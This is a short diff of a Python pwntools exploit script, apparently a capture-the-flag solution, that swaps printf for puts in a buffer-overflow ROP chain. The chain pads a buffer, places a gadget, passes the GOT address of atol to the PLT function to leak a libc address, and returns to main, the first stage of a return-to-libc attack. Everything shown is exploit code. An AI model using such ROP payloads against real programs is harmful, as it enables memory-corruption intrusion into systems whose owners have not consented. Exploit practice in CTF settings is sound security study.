@@ -70,7 +70,7 @@ p.sendline(str(key))
 payload = 'a' * (buffer_size + 8)
 payload += p64(gadget)
 payload += p64(r.got['atol'])
-payload += p64(r.plt['printf'])
+payload += p64(r.plt['puts'])
 payload += p64(main)
 
 p.recvuntil('exploit : ')
